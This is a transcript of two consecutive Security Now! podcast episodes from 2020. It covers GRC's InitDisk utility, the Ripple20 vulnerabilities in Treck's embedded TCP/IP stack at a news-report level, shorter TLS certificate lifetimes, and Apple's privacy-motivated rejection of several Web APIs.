LEO:  Dammit, no.  Can we go just to the end of the year?  How about that?  We'll do a holiday episode.  Give me a couple extra.  All right, all right, all right.



STEVE:  I don't know how we'll number them, Leo.



LEO:  We don't have to give a number.



STEVE:  A, B?



LEO:  Yeah, A, B, and C.  Be 99A, B, and C.  That settles it.



STEVE:  Actually, we could do -3, -2, -1, and zero.



LEO:  We've never done the zero.  We can't really do a podcast that doesn't start at zero.



STEVE:  Oh, we can do 0, 00, and 000 because I do have three digits.



LEO:  You see?



STEVE:  So that could work.  Yeah, I don't know.



LEO:  It'll also be...



STEVE:  That does sort of fudge the ending.  It makes it a soft...



LEO:  It'll also be close to 20 years of TWiT, yeah.  It's good, yeah.  Well, it's up to you.  I don't, you know, TWiT's going to reach its thousandth right about then, as well.  So that will be intriguing, to see what happens after we go to four digits.



STEVE:  So I do have a piece of freeware to announce, which I think our listeners may find useful.  It's Windows, even though it's got some DOS connection.  It's called InitDisk, I-N-I-T-D-I-S-K.  You could google "grc initdisk."  It already turns up.  Or it is under GRC's main menu under Freeware/Utilities.  Or you can just go to GRC.com/initdisk.  The back story is that to aid the forthcoming testing of SpinRite's new technologies, we needed a simple way to prepare a bootable USB drive.  And because I always start from scratch at the beginning, from the bare metal, and then build up from there, we wound up with a uniquely capable new utility.



During our testing, a number of those who were testing found that USB thumb drives they had long believed to have died and to be dead were immediately brought back to life by InitDisk.  And again, I wrote it all in assembler.  It's from scratch.  I wanted to basically take complete ownership, create a really robust formatting utility for removable USB.  And just this morning I encountered another report by a frequent contributor who goes by "Obiwan" in the newsgroups.  He had not been participating all along, so he wasn't aware of InitDisk's ability to bring dead USB drives back.



He said:  "Tried it on a rather old TDK TF10 (8GB) USB stick which was 'dead,'" he has in quotes, "that is, Windows was unable to recognize it.  At best it was recognized, but a very small capacity."  He said:  "Found it inside a closet.  Not sure how long it was there.  At any rate, downloaded" - meaning InitDisk - "and started InitDisk.  Upon startup it asked me to insert the device," which is the way InitDisk operates, the way it identifies what you want to reformat.  He says:  "...asked me to insert the device.  Did so by inserting the" - and again in quotes - "'dead' key.  InitDisk recognized it," he said, "so I went on with the 'NUKE.'"



That's what you actually have to do.  Once InitDisk recognizes it, it shows you everything it knows about it to help you identify it.  And then you have to type N-U-K-E in order to give it permission.  So he says:  "...went on with NUKE and, at end, had the 8GB stick alive again."  He says:  "Not bad, I think.  Further checks performed using various tools reported it to be okay.  So, well, at least that InitDisk tool may be useful to recover, to some extent, not pretending miracles, some USB sticks."



So anyway, as I said, I don't think Obiwan had been following along, so he wasn't aware that we had seen a number of these instances.  So the industry has a bit of new freeware from GRC.  As I mentioned, it's the first of what I expect will be a couple offshoots from SpinRite's work.  The next thing will be a very cool bare metal bootable mass storage device benchmarking tool.  That's what I'm immediately going to start working on.  Given the fact that GRC's DNS Benchmark remains our number one most downloaded utility, it's now at nearly 5.8 million downloads, and it's being downloaded at a rate of 3,000 per day, my hope is that this forthcoming mass storage benchmark will also develop a following.



And there's a method to my madness here.  Everyone who uses it will also be simultaneously testing and verifying the new hardware driver suite that will be then moved into SpinRite.  So the more early testing we can get of that new code, the better.  And also, anyone wishing to verify that the next and all future SpinRites will work for them on whatever hardware they have will be able to use this free benchmark utility, which utilizes all of the same technology, to verify that for themselves, to make sure.  And of course, if not, I want to know about it so I can fix it now.  So I'll also be launching shortly a new set of GRC forums to make reporting and managing of any problems much easier for the users of the benchmark.  So lots of happy activity going on over here, and some cool new code being produced.



You can optionally have InitDisk create a bootable FreeDOS disk for you.  You just add the command "freedos" after "initdisk."  It's not the default because most people are not going to want that.  They're just going to want a nice reformatted USB stick or drive.  You can even use one, like I used a USB-to-SATA interface, and it beautifully formatted.  It'll run on any drive up to 2.2 terabytes, which is the limit for the 32-bit sector count which the MBR, the Master Boot Record, uses.  This is not yet GPT.  We will be at some point adding that, but not at this point yet.  This is just to make it easy to boot things for people who want to play with my future forthcoming work in FreeDOS.



Okay.  Ripples in the space-time continuum.  The rhetorical question is, just how much damage can a little two-person company situated in Cincinnati, Ohio, do to the world?  The answer to that question was likely revised this week.  The company is Treck, T-R-E-C-K, Inc.  They've got a very up-to-date-looking website at https://treck.com.



The site's home page declares:  "Since 1997" - so 23 years - "Treck has been designing, distributing, and supporting real-time embedded Internet protocols for worldwide technology leaders."  What could possibly go wrong?  No, it doesn't say that.  They said:  "The Treck TCP/IP stack designer and Treck cofounder has more than 20 years experience and is a leading expert in embedded Internet protocols."



Well, as we know, anyone can be forgiven for making a mistake.  And arguably, someone should probably have given a good hard look at these offerings before allowing 23 years of embedded device adoption to have occurred.  But now is when we are.  And as the Hacker News summed it up in their headline, "New Ripple20 Flaws Put Billions [with a B] of Internet-Connected Devices at Risk of Hacking."



The Hacker News wrote at the top of their coverage:  "Dubbed 'Ripple20,' the set of 19 vulnerabilities resides in a low-level TCP/IP software library developed by Treck which, if weaponized, could let remote attackers gain complete control over targeted devices without requiring any user interaction.  According to Israeli cybersecurity company JSOF" - which I'll just be saying as JSOF - "who discovered these flaws, the affected devices are in use across various industries ranging from home consumer devices to medical, healthcare, data centers, enterprises, telecom, oil, gas, nuclear, transportation, and many others across critical infrastructure."



So switching to JSOF's summary and to get some additional details, they said:  "The JSOF research lab has discovered a series of zero-day vulnerabilities in a widely used low-level TCP/IP software library developed by Treck, Inc.  The 19 vulnerabilities, given the name Ripple20, affect hundreds of millions of devices or more and include multiple remote code execution vulnerabilities.  The risks inherent in this situation are high.  Just a few examples," they say.  "Data could be stolen from a printer, an infusion pump's behavior could be changed, or industrial control devices could be made to malfunction.  An attacker could hide malicious code within embedded devices for years.  One of the vulnerabilities could enable entry from outside into the network boundaries.  And this is only," they said, "a small taste of potential risks.



"The interesting thing about Ripple20," they wrote, "is the incredible extent of its impact, magnified by the supply chain factor.  The widespread dissemination of the software library and its internal vulnerabilities was a natural consequence of the supply chain's ripple effect.  A single vulnerable component, though it may be relatively small in and of itself, can ripple outward to impact a wide range of industries, applications, companies, and people.  Ripple20 reached critical IoT devices from a wide range of fields, involving a diverse group of vendors.  Affected vendors range from one-person boutique shops to Fortune 500 multinational corporations, including Cisco, HP, EMC, GE, Broadcom, NVIDIA, Schneider Electric, Intel, Rockwell Automation, Caterpillar, Baxter, as well as many other major international vendors suspected of being vulnerable in medical, transportation, industrial control, enterprise, energy (oil and gas), telecom, retail and commerce, and other industries."



They said:  "Ripple20 is a set of vulnerabilities found on the Treck TCP/IP stack.  Four of the Ripple20 vulnerabilities are rated critical, with CVSS scores over 9, and enabling remote code execution.  One of the critical vulnerabilities is in the DNS protocol and may potentially be exploitable by a sophisticated hacker over the Internet, from outside the  network boundaries, even on devices that are not connected to the Internet.



"A second whitepaper to be released" - because I looked at their first whitepaper - "to be released following Black Hat USA 2020" - so this is again a pre-Black Hat presentation announcement - "will be detailing the exploitation of CVE-2020-11901, a DNS vulnerability on a Schneider Electric ACP UPS device."  They turn it off remotely with no authentication required.  "The other 15 vulnerabilities are in ranging degrees of severity, with CVS scores ranging from 3.1 up to 8.2, and effects ranging from denial of service of the device to potential remote code execution.



"Most of the vulnerabilities are true zero-days, with four of them having been closed over the years as part of routine code changes, but remained open in some of the affected devices.  Three were lower severity; one was higher.  Many of the vulnerabilities have several variants due to the stack configurability" - that is, the TCP/IP stack configurability, which things were included and which were not - "and code changes over the years.  Ripple20 are the only vulnerabilities reported, as far as we know" - in other words, nobody ever looked before - "except for some general logical vulnerabilities referenced in the past, which pertain to many stack implementations and usually had to do with RFC misinterpretations or deprecated RFCs."  So just, you know, standard spec things.



They said:  "Ripple20 vulnerabilities are unique both in their widespread effect and impact due to supply chain effect and being vulnerabilities allowing attackers to bypass NAT and firewalls and take control of devices undetected with no user interaction required.  This is due to the vulnerabilities being in a low-level TCP/IP stack" - meaning also in the kernel - "and the fact that for many of the vulnerabilities the packets sent are very similar to valid packets, or in some cases are completely valid."  And in fact I looked at the first whitepaper where they fragment a DNS packet, and it's completely valid, but it causes a buffer overflow that allows you to inject your own code into any of these devices.  "This enables," they wrote, "the attack to pass as legitimate traffic," because it is.



So to give some sense for what has just happened, I have the top six vulnerabilities with the highest severities rated from 10 down to 9.  And of course 9 is still "house on fire."  So the number one most severe vulnerability, the one I referenced, and this is a CVE-2020-11896, and this is from the formal CVE severity scoring.  This is not these guys pumping this up.  This has a severity score of 10.0, right, on a scale of one to 10:  "Improper handling of length parameter inconsistency in IPv4 UDP component" - that's DNS - "when handling a packet sent by an unauthorized network attacker.  This vulnerability may result in remote code execution."  And I'll just tell everybody that you fragment a UDP, a DNS packet, and you get to run code on these devices.



Also 10.0:  "Improper handling of length parameter inconsistency in IPv6 component when handling a packet sent by an unauthorized network attacker.  This vulnerability may result in possible out-of-bounds write."  So you get to write over areas that you're not supposed to.  Again, executing code.



"9.8:  Improper handling of length parameter."  And so forth.  Anyway, there's 19 of these.  And anytime you see "improper handling of length parameter" it's very much like the problem we just talked about in the web server in the 79 Netgear firmware instances, where you're able to provide the length.  It is the case that reassembly of fragmented packets is fraught with problems.  I don't know why, but in the old days that was a constant source of errors.  And these guys at Treck made the errors.



And unfortunately their code has been widely adopted.  It's written in C.  They advertise that it runs on everything, any microprocessor, any embedded platform, with or without an underlying operating system, on an RTOS or not.  I mean, it's like everybody's answer.  And it's probably affordable.  So it got widely adopted.  And now billions of devices have it.  And as will be detailed at Black Hat, further detailed, are insecure.



JSOF attempted to be as responsible as possible.  They said that their disclosure had been postponed twice as pleas for more time came from some of the many vendors that they were able to determine were affected.  And of course they have limited surveillance abilities, with some of the vendors voicing COVID-19-related delays for the reason they weren't able to act more quickly.  So out of consideration for those companies, the time period was extended from 90 to over 120 days.  And even so, some of the participating companies became, they wrote, difficult to deal with as they made extra demands.  And some, from their perspective, seemed much more concerned with their brand's image than with patching the vulnerabilities.  In other words, they want it to be not mentioned as being, you know, like they were a company or their stuff was vulnerable.



So we know today that hundreds of millions, in the best case, of affected devices scattered all across the globe will almost certainly never receive security patch updates to address these critical Ripple20 vulnerabilities.  We are truly in, probably looking into the future, a world of hurt.  And in some despair, and not knowing what else to recommend, ICS-CERT recommended  consumers and organizations, they had two bullet points:  "Minimize network exposure for all control system devices and/or systems, and ensure that they are not accessible from the Internet."  Unfortunately, their job may be to be accessible from the Internet.  "Locate control systems networks and remote devices behind firewalls" - unfortunately that won't be effective - "and isolate them from the business network."



And then they said:  "Besides this, it's also advised to use virtual private networks for securely connecting your devices to cloud-based services over the network."  Which again may not be at all practical due to the nature, the embedded nature of these things.



So we talked last week about the dangers inherent in having a technological monoculture.  At that point we were talking about Chromium and the Brave browser, I think.  And of course they had switched to Chromium, too.  Here we have a highly defective, very vulnerable TCP/IP networking library that has been on the market for more than 20 years, more than two decades.  It is riddled with just-discovered critical vulnerabilities of varying degrees of severity from 10.0, many of them, down.



And there is just no way to update most of the affected devices.  For those that are recently released, that are still in a maintenance contract or maintenance loop, maybe they've got self-updating facilities.  But lots of embedded things don't.  We have said till we're blue in the face how crucial it is that anything that is connecting these days have a means of updating itself because that's the only way to get the job done.



And most users who are not listening to this podcast will never even be aware that anything like this has happened.  And even those of us who are privy to this podcast may not know what TCP/IP stack random embedded things have.  Do our netcams have that?  Maybe.  Probably.  Maybe not.  Who knows?  I mean, this is an internal library compiled into the ROM in these devices.  They may not even be updatable at that level.  And yet all of these networks and the network security we're all depending upon has arguably just taken probably a noticeable hit.



And you can absolutely bet that state-level and other hackers for hire are rubbing their hands together.  And I'm sure that lists of affected hardware are being assembled at the moment.  And it may be that people will just send test pings or test UDP, fragmented UDP at stuff and see if it crashes.  If it does, it's probably got this Treck firmware down in its internals.  The Internet is already a target-rich environment, and it just got a whole lot richer.



LEO:  It's interesting that a number of these vulnerabilities are mishandling of length variables.



STEVE:  Yes.



LEO:  Others are not sanitizing inputs.  It's almost the same problem as with the Netgears.



STEVE:  Yup, classic.



LEO:  How did this go undetected for so long?



STEVE:  Yeah.  That's just it.



LEO:  It's just not open source.  That's part of the problem; right?  So nobody...



STEVE:  Correct.



LEO:  And it's embedded, so probably nobody was testing it.



STEVE:  Yeah.  I think that it worked, I mean, and that's just it.  Some engineer somewhere said, oh, look.  It works, and I'm done.  My problem has been solved because my boss said we need to hook this to the Internet.  So, yay.



LEO:  Oh, gosh.  Golly.  Just amazing.  Wow.



STEVE:  Yeah.



LEO:  All right, Steve.  There we go, once again, you've made me all excited about the future of the Internet.  This one's not going to get fixed.  Period.  Period.



STEVE:  No, it's not.



LEO:  It's in embedded devices.



STEVE:  It's everywhere.  It's too widespread.  It's in our printers and in our light bulbs.



LEO:  Wow.  And you mentioned using a VPN to connect to our IoT devices.



STEVE:  No, that was just CERT saying...



LEO:  I don't think that's a good idea, either.



STEVE:  Yeah, that's right.  Put your light bulb on a VPN.  That'll work.



LEO:  No.  All right.  Oh.  How depressing is this?  What could you do?  What would the mitigation be?  Since we don't know which of our many, many, many devices with embedded TCP stacks are vulnerable.



STEVE:  The only practical thing you could do would be to create a purpose-specific filter like in a router.  So your router would have to be trained about never accepting fragmented UDP.  There have been other UDP fragmentation attacks.  And you could argue that there isn't a good reason for UDP to be fragmented nearly as much as it once was.  So you could just say "Drop any UDP packet with the frag bit set in its header."  And so that would immediately protect you from some of these vulnerabilities.



And so you could argue, you could go through and carefully develop - and I imagine that some of the big IDS vendor guys are probably going to do that.  They're going to add filters to protect their clients' internal networks from anybody sending this stuff from the outside.  But as a device just raw, plugged into the Internet, I don't think there's any way to, I mean, it's just not going to get its firmware updated.



LEO:  God.  That's so depressing.  So depressing.  Well, thank you, Steve, for cheering me up, anyway.  What are you going to do?  It's good, I mean, we've got to know this stuff; right?  That's why the disclosure happens.



STEVE:  Yup, forewarned.



LEO:  Yeah.  Steve Gibson's at GRC.com.  That's where you'll find him and this show and 16Kb versions of the audio, which is wild.  I don't know who's downloading those.  Do people download those every week?



STEVE:  Yeah, they do.



LEO:  You can check?  Yeah?  Wow.



STEVE:  Yeah.



LEO:  Somebody wants them.  They sound like Thomas Edison on his cylinder, his first recorder.  But they're there.  You can understand them.  You can also get 64Kb audio, which sounds normal.  You can also get, and this is maybe the most valuable version - well, as normal as we get.  You can also get a beautifully crafted transcript by Elaine Farris, so you can read along as you listen.  We have audio and video at our site, TWiT.tv/sn.  By the way, when you're at GRC.com getting all that stuff, read all the other things there.  It's fun.



And pick up a copy of SpinRite.  If you get v6, you'll get v6.1 the minute it's available.  You also get to participate in the beta tests.  And you can already see, Steve's like NASA.  All that research spins off into useful products.  You know, it just spins off.  So you'll be part of the spinoff.  Just go to GRC.com and pick up SpinRite, and then you can spin off.



Our site is TWiT.tv/sn.  It's also on YouTube.  Best thing to do is subscribe in your favorite podcast application.  You'll get it automatically - Overcast, Pocket Casts, Stitcher, Slacker, Podcast Republic.  I can go on and on.  You know what I'm talking about.  Find the show.  Subscribe.  You'll get it every week, the minute it's available.



We do the show every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  Watch it live as we produce it, TWiT.tv/live, or listen live.  And you can also chat, if you're listening live, at irc.twit.tv.  After the fact, our TWiT community is open, as are Steve's forums.  Steve's forums are at GRC.com.  Ours is at TWiT.community.  Thank you, Steve.  Have a great week, and we'll see you next week on Security Now!.



STEVE:  Thanks, buddy.  Right-o.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#773

DATE:		June 30, 2020

TITLE:		Ripple20 Too

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-773.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at news in the shortening of certificate lifetime change, at Apple's decision to deliberately ignore support for a bunch of new Web APIs, at Apple's announcement of DoH support, at some troubling Mozilla/Comcast news, at some welcome legislation to head off the use of facial recognition, and at another less welcome attempt to outlaw strong encryption.  We also look at the growing legislation against mandatory "chipping" and remind our listeners about the utility of VirusTotal.  Then, after catching up with a bit of miscellany and listener feedback, we revisit last week's very worrisome revelation of the many flaws in a very widely used embedded TCP/IP stack.  There's much news there.



SHOW TEASE:  It's time for Security Now!. Steve Gibson is here.  Lots to talk about, including the Face Recognition Moratorium Act and, oh, boy, the new encryption law about to be voted on in Congress.  He'll also talk a little bit about Ripple20 once again.  It's getting even worse.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 773, recorded Tuesday, June 30th, 2020:  Ripple20 Too.



It's time for Security Now!, the show where we cover your security, your privacy, and your computer and how it works, all with this guy right here.  He's the king of Security Now!, the guy in charge, Mr. Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Leo, great to be with you again.  Yes, I'm saluting with my other hand because the microphone is blocking my normal salutation.  Outside the house is a wood chipper, which is grinding up lord knows what, sounds like bricks.



LEO:  Uh-oh.



STEVE:  But the good news is these amazing Heil microphones we use are extremely directional.  And so even though it's kind of a pain due to my setup to put the microphone on the other side, I had sufficient notice to do so today, and the microphone is aimed away from the wood chipper, rather than right at it.  So I figured that was a good thing to do for the sake of our listeners, whom we care so much about.  That's why we're here every week for 773 weeks.  That's our episode for the end of the month, end of June.



More news - details, actually - have some to light about the really horrific Ripple20 vulnerabilities.  And so with a little tongue in cheek I called this episode "Ripple20 Too," T-O-O, because now that we know a lot more detail, you know, exactly which hundreds of millions of devices are vulnerable to this longstanding, multidecade, very worrisome TCP/IP stack vulnerability set, I thought we needed to follow up with that.  And there wasn't anything else that was breathtaking that happened, although lots of interesting news.



We've got the actual shortening of certificate lifetime change, which we'll remember was something that Apple surprised everybody with back in February.  Other people are coming onboard.  So we need to update on that.  We also have Apple's interesting decision to deliberately ignore their support for a bunch of new Web APIs.  They've said no, thank you.  And frankly, I can't disagree.



LEO:  Yeah, when I read them, I thought, the browser could tell you that?  I was like, wow.



STEVE:  I know.  And that's, you know, that's what's so nutty about what the W3C Consortium are doing.  They've got to be sitting around in some sort of brainstorming meeting, asking themselves, what else can we do?



LEO:  What other features can we build in?



STEVE:  Yeah, yeah, like how many icons are on the user's desk.  It's like, what?  Well, that could be useful.  Oh, okay, let's put that in there.  Anyway, we've also got Apple's kind of weird announcement of the way they're going to be implementing DoH and, yeah, DOH and DOT, which we're going to cover.  Some troubling, believe it or not, Mozilla/Comcast news.



LEO:  Uh-oh.



STEVE:  Also, we've got some welcome legislation to head off the use of facial recognition; a less welcome attempt to outlaw strong encryption, another one, separate from the EARN IT Act, but with a common sponsor, not surprisingly.



LEO:  And even more clear in its desire.  Oh, boy.



STEVE:  Yes, it is very explicit, yeah.



LEO:  Yeah, yeah.



STEVE:  It doesn't have the slime factor that EARN IT did, but it's still, like, in your face.  We're also going to look at the growing legislation against, thank goodness, mandatory chipping of people, not pets, but yes, people.  And I wanted to remind our listeners about the utility of VirusTotal as a consequence of my having touched it recently, and also some news there.  Then we're going to catch up with some bit of miscellany, some listener feedback, and then revisit last week's very worrisome revelation about the many flaws in a, as we know, very widely used embedded TCP/IP stack.  And I still have the feeling, even with all this, that we're just looking at the tip of the iceberg.  But we will see.



LEO:  Bad news.  I think Anthony Fauci says that you should stop touching your VirusTotal, but we'll talk about that later; okay? 



STEVE:  Good idea.  So last February we talked about Apple's surprise announcement during the CA Browser Forum that, in the future, and this was just unilateral, that in the future it, for Safari, on all of its platforms, would be rejecting any web server certificate having a not-valid-before date, which is technically the way the date range is stated, so it's very clear, not valid before date after August 31st of this year, of 2020, and which has a certificate lifetime greater than - total lifetime greater than 398 days.  So in other words, starting just two months from now, that is to say, from September 1st on, all CA certificates issued for use by web browsers must be issued with a one-year plus 33 days lifetime or shorter, not longer.



So this is the death of the more arguably convenient two- or three-year web server certs that we've traditionally been using.  Essentially, sort of Apple biting the bullet and pushing an issue that the various non-certificate authority participants in the so-called CAB Forum, the CA Browser Forum, had been asking for for a long time.  Google had put forth this issue, this measure for a vote at the prior meeting, and it had been voted down in a partisan vote by the certificate authorities that said, no, we don't want to shorten server certificates to a year.



Well, Apple said, okay, tough.  We're just not going to accept any.  And arguably, Safari is strong enough that basically they forced the issue.  So when I talked about this initially in February, I discussed the many implications of this in great depth and detail.  So I'm not going to go into all that again.  If anyone has joined us since then or wants a refresher, it's back in February.



The reason this is back in the news is that now the other two significant browsers in the industry, Mozilla and Google, plus all Chromium-based offshoots of Google's Chrome browser, have also announced their exactly aligned policies.



LEO:  Yes.  That's really interesting, wow.  That'll hurry this along.



STEVE:  Google's Ryan Sleevi, yeah, he posted as sort of like their equivalent of things we're going to change, in the Chromium blog he said:  "Enforce 398-day validity for certificates issued on or after 2020-09-01," September 1st of this year.  And then the body of the message is:  "Enforce publicly trusted TLS server certificates have a lifetime of 398 days or less, if they are issued on or after September 1st, 2020."  And he said:  "Certificates that violate this will be rejected with" and then the error is "ERR_CERT_VALIDITY_TOO_LONG and will be treated as mis-issued."



And also, following up, Mozilla's Kathleen Wilson posted:  "Limit reuse of domain name verification to 395 days," and that was #206.  And I think she did say 395 because I'm sure I copied and pasted.  So they're off by three, it should be 398, I believe, because I remember one year plus 33.  And that's to sort of give people a little bit of fudge room.



So there is a long and very interesting discussion, for people who like such things, among the industry insiders who are the ones who make these essentially earth-moving decisions.  So I've included the Google Group's discussion thread link in the show notes for anyone who's interested.  I mean, it's back and forth and a lot of discussion.  But basically it comes down to, well, you know, this is what we wanted.  Thank you, Apple, for biting the bullet.  We're all going to jump onboard.



And, you know, the certificate authorities will end up changing their model.  Rather than, for example, you having to have a cash transaction annually, you'll be able to purchase some block of time that you want to have certificates from them.  And I imagine, since that does create a little bit of lock-in, that they may extend that.  They may say, hey, stay with us, commit to staying with us for 10 years, and we will lower the per-year cost of certificates.  And then it'll be like, you log into your account and basically you reissue a certificate before the one you have expires.



What this will also do, you know, we always run across instances where people are forgetting or letting it lapse, or maybe it's a holiday, or it's a COVID-19 event, one way or the other server certificates are expiring, and they're finding out only when people are screaming that they can no longer access the website.  So maybe it being an annual thing, as opposed to for example every three years, which maybe you're more likely to forget, that might help prevent that.  And I know in my relationship with DigiCert I'm getting email from them all the time saying, hey, this or that's getting ready to expire, so don't let that slip by.  So you certainly want to be, I mean, in general, absolutely want to make sure you have an email address that allows you to receive important security notifications.



I would argue that notes from your certificate authority is one class.  And as we'll be seeing in several of the stories that we have this week, it's absolutely important, crucial for the software that you're using, the vendors of the software that you're using have a way to reliably get a hold of you to tell you when there's some action you need to take.  And when you get that kind of notice, at least open the mail.  Judge for yourself how important it is because it can be really crucial.



We were talking at the top of the show, Leo, because you were looking also at these Web APIs, I mentioned that Safari has chosen to eschew adopting these 16 Web APIs for the sake of user privacy.  I would argue, who cares?  Like the magnetometer?  Okay.  Apple has decided not to build these newly defined APIs into Safari because they both individually and collectively could pose a credible threat to user privacy by opening new opportunities for user fingerprinting.  So let's quickly enumerate these.



Web Bluetooth, which allows websites to connect to nearby Bluetooth LE devices.  That one, I don't know.  I could see some uses for that, frankly, as the designer of SQRL.  If we reliably had Bluetooth connectivity to the browser, that would create a direct connection between somebody's phone and the browser to create a local authentication loop to close that loop that no bad guy in Russia or China or some other foreign land could intercept.  So that one's a little near and dear to my heart.  But it's not available in Chrome.



The MIDI API, right, M-I-D-I, which allows websites to enumerate, manipulate, and access MIDI devices.  Okay.  The  Magnetometer API, allowing websites to access data about the local magnetic field surrounding a user, as detected by the device's primary magnetometer sensor.



LEO:  Well, there you go.



STEVE:  Which direction are you facing?  And, for example, we've talked in the past about the battery API.  And one of the problems was that it offered so much resolution, like I don't remember now, 16 bits of resolution, that if an ad could read your battery level, and then you as a user went to a different, completely unaffiliated website with exactly the same 16-bit battery level - okay.  16 bits does not uniquely disambiguate you from the rest of the world.  But when that is added to any other browser-sniffing, fingerprinting behavior that may be available, it represents a bunch of additional bits of - what would that be?  Deentrification?  There's a new word.  Entropication, deentropication.  Anyway.



LEO:  There you go.



STEVE:  So magnetometer, which direction you're facing.  Oh, and I just should mention that, as a consequence of that, it was decided that we did not need 16 bits of battery state, but it might still be nice to have some.  So some of the browsers just fuzzed out the lower bits.  They just said, we're not going to tell you exactly what the user's battery level is because you don't need to know.  You only need to know if it's low enough that you shouldn't start a processor-intensive cryptocurrency mining on their browser right now or you'll burn up their battery.



Anyway, we also have the Web NFC API, which would allow websites to communicate with NFC tags through a device's NFC reader.  That seems sort of useful.  But not in Safari.  The Device Memory API, allowing websites to receive the approximate amount of device memory in gigabytes.  To me that seems like it's simply for the purpose of tracking someone.  So, yeah, we could do without that one.



The Network Information API, providing information about the connection a device is using to communicate with a network and provides a means for scripts to be notified if the connection type changes.  I would worry about that from a security standpoint.  That sounds like it could be leaking something that bad guys might use.  I mean, I'm sure they would have thought about that in the W3C Consortium, but still.



Oh, and speak of the devil, the Battery Status API, allowing websites to receive information about the battery status of the hosting device.  I guess other browsers that have it are reducing its resolution.  Apple says no, none of your business.  And you know, it's interesting, too, because, I mean, there are enough of these that it means that - there are enough of these that Safari's not going to be supporting that it sort of limits websites' ability to depend upon those.



On the other hand, we've seen the numbers, and the Chromium browsers - which, by the way, are the browsers that support almost all of these, if not all of these, just because that's where Chromium is - they have the lion's share.  So I guess, if nothing else, websites will have to be able to tolerate a lack of some of this functionality.  Maybe they'll tell people, go get Chromium if you want to use these features.  We also have Web Bluetooth Scanning.  This seems like a bad idea.  Allows websites to scan for nearby Bluetooth LE devices.  What could possibly go wrong?



LEO:  Yeah.



STEVE:  The Ambient Light Sensor.  Web Consortium, really?  Okay.  Lets websites get the current light level or luminance of the ambient light around the hosting device via the device's native sensors.  If any.



LEO:  All of this is really designed to make the browser be like a built-in application.



STEVE:  Yes.



LEO:  That's the whole point really; right?



STEVE:  Yes, yes.  And we've talked about...



LEO:  So you probably have many apps that do that.  But you don't want your browser to do it.



STEVE:  Yes.  And we've talked often about how the browser is becoming sort of the replacement desktop.  Browser web apps are now really a thing.  We also have, get this, the HDCP - remember, that's the high-definition copy protection, HDCP.  We have the HDCP Policy Check extension which allows websites to check for HDCP policies, used in media streaming and playback.  Okay.



The Proximity Sensor allows websites to retrieve data about the distance between a device and an object, as measured by a proximity sensor.  Like, what?  The user?  Okay.  The WebHID allows websites to retrieve information about locally connected Human Interface Device (HID) devices.  And Leo, the Serial API, as in a serial interface, allows websites to write and read data from your COM ports, from serial interfaces, used by devices such as microcontrollers, 3D printers.  So okay, you know, hook up your 3D printer.  The website is able to talk to it directly and print something.  But not in Safari.



The Web USB lets websites communicate with devices via USB.  Interesting.  The Geolocation Sensor, a more modern version of the older Geolocation API that lets websites access geolocation data.  And maybe as a consequence of the still ongoing launch of the new third-generation GPS satellite that happened between your previous podcast and this one...



LEO:  Yeah, that was cool.



STEVE:  ...that data got even more accurate.  Or will, eventually, once it's up and in orbit.  And then we have the User Idle Detection, lets websites know when a user is idle.  So, okay.  All of those things Apple feels are not worthy of implementation, they are mostly implemented in Chromium-based browsers.  Firefox has a few.  Chrome will have none.  And of course Apple feels that, whereas third-party cookies were once the tracking mechanism of choice, as we know, they are readily blocked these days by savvy users.  And much as I had my once naive hopes for the Do Not Track header - and Leo, you always chuckled at that, and you were right, as you could adopt the phrase DNT was DOA because it just never got off the ground.



LEO:  No, no.



STEVE:  These days, in the place of cookies, the use of surreptitious fingerprinting has been steadily growing to the point that fingerprinting has now become the standard means of tracking users online for the advertising technology market.  That's what the ad tech guys have ended up moving to is browser fingerprinting.  So it's gone from sort of like an oh, gee, that's sort of an interesting idea, to no, that's the way we're going to track people now.  And of course its growth has been driven by the browser vendors who have steadily been adding more or less subtle, sometimes less subtle, anti-tracking features to their browsers in the interest of enhancing the privacy of their users.



So anyway, Apple said that WebKit's first line of defense against fingerprinting is not to implement web features which increase fingerprintability in the first place, and offer no safe way to protect the user.  And as for the traditional Web APIs which have been implemented in Safari for years, Apple has said it has been working to reduce their fingerprintability vector.  Apple said that they had removed support for custom fonts, meaning that only presenting built-in fonts which are the same for all users with the same system.  We know that enumerating installed fonts is one of the ways that websites were fingerprinting users.



They've also said they've removed minor software update information from the user agent string, so sort of fuzzing the version number so that it's not as specific.  They've also removed the Do Not Track flag, which ironically was being used as a fingerprinting vector.  If you had it turned on or turned off, it was generally sticky, and so it added one bit of fingerprinting disambiguation.  So they just said we're going to turn it off for everybody, cannot be used.  They've also removed support for any plugins on macOS.  Other desktop ports may differ.  And of course plugins were never a thing on iOS, so nothing lost there.



They require a user's permission for websites to access the Device Orientation and Motion APIs on mobile devices because the physical nature of motion sensors may allow for some additional device fingerprinting.  And they finally said that they prevent fingerprinting of attached cameras and microphones through the Web Real-Time Communications API, you know, that's WebRTC.  So anyway, there again is Apple being proactive.  And it sort of goes along with the Apple user profile.  You know, a little less focused on gee whiz features and a little more on just solid functionality and increase in privacy and security.  So good for those guys.



Last Wednesday, during Apple's developer conference, Tommy Pauly, who's an Internet Technologies Engineer at Apple, explained that the fall releases of iOS 14 and macOS 11 would both be supporting the much beloved DNS-over-HTTPS and also DNS-over-TLS protocols.  And of course that's good news for encrypted DNS and privacy, kind of.  From what Tommy said, it doesn't sound as though it's going to be like an immediately consumer-friendly feature, at least not at the start.  He said that developers could create apps to apply DoH and DoT settings for the entire operating system via network extension apps or MDM profiles, or to individual apps, or to an app's selected network requests.



So mostly security-aware users, sounds like they would have to add it as, like, an app to their device in order to get entire iOS device or Mac using the DoH provider of their choice.  So I suppose somebody could create an app to enable that.  But I don't get why not a setting in the OS's network settings.  To me that would seem to be a far better solution.  Maybe Apple regards it as like an advanced feature?  I don't know.



